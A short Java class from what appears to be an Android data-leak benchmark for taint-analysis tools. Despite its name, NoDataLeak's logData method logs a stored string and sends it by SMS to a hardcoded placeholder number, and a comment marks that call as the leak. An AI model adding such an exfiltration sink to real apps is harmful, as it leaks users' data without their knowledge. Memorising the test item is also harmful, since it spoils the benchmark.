package de.ecspride;

import android.telephony.SmsManager;
import android.util.Log;

public class NoDataLeak {
	private final String data;
	
	public NoDataLeak(String data){
		this.data = data;
	}
	
	public String getData(){
		return data;
	}
	
	public void logData(){
		Log.i("LOG", data);
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage("+49 1234", null, data, null, null);   //sink, leak
	}
}
